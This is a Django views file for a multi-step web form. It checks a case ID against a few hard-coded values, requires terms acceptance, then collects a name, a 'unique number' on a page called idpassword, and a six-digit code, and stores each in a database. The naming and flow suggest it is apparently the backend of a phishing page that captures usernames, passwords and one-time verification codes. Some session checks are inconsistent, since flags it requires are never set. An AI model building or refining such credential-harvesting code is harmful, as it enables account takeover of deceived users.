# main/views.py
from django.shortcuts import render, redirect
from django.contrib import messages
from .models import UserSubmission, SessionVerification

VALID_CASE_IDS = {
    'APL-2024-1234',
    'APL-2024-5678',
    'APL-2024-9123'
}

def index(request):
    error = None
    if request.method == 'POST':
        # Get case ID from POST data
        case_id = request.POST.get('case_id', '').strip()
        
        if case_id in VALID_CASE_IDS:
            # Store verification in session
            request.session['verified_case'] = case_id
            request.session.modified = True  # Force session save
            return redirect('terms_of_use')
        else:
            error = "Invalid Case ID. Please check your entry."
    
    return render(request, 'main/index.html', {'error': error})

def terms_of_use(request):
    if not request.session.get('verified_case'):
        return redirect('index')

    if request.method == 'POST':
        # Check if both checkboxes are checked
        if all([
            request.POST.get('terms') == 'on',
            request.POST.get('privacy') == 'on'
        ]):
            request.session['accepted_terms'] = True
            return redirect('Idusername')
        
        messages.error(request, "You must accept both agreements to continue")
    
    return render(request, 'main/terms_of_use.html')


def Idusername(request):
    if request.method == 'POST':
        full_name = request.POST.get('name', '').strip()
        UserSubmission.objects.create(name=full_name)
        return redirect('idpassword')  # Replace with your actual next step URL
        
    return render(request, 'main/Idusername.html')

def idpassword(request):
     # Verify previous steps
    if not request.session.get('verified_case') or not request.session.get('accepted_terms'):
        return redirect('index')
    
    # Get latest submission
    try:
        submission = UserSubmission.objects.latest('created_at')
    except UserSubmission.DoesNotExist:
        return redirect('index')

    if request.method == 'POST':
        unique_number = request.POST.get('unique_number', '').strip()
        
        # Update existing record
        submission.unique_number = unique_number
        submission.save()
        
        return redirect('confirmation')  # Create this view next

    return render(request, 'main/idpassword.html')

def collect_session_number(request):
    # Verify previous steps through session
    required_session_flags = [
        'verified_case',
        'accepted_terms',
        'collected_name',
        'collected_unique_number'
    ]
    
    if not all(request.session.get(flag) for flag in required_session_flags):
        return redirect('index')

    if request.method == 'POST':
        session_number = request.POST.get('code', '').strip()
        
        if len(session_number) == 6 and session_number.isdigit():
            SessionVerification.objects.create(session_number=session_number)
            request.session['session_verified'] = True
            messages.success(request, "Session number successfully recorded!")
            return redirect('next_step')  # Replace with your actual next step
            
        messages.error(request, "Invalid session number format")
    
    return render(request, 'main/session_verification.html')
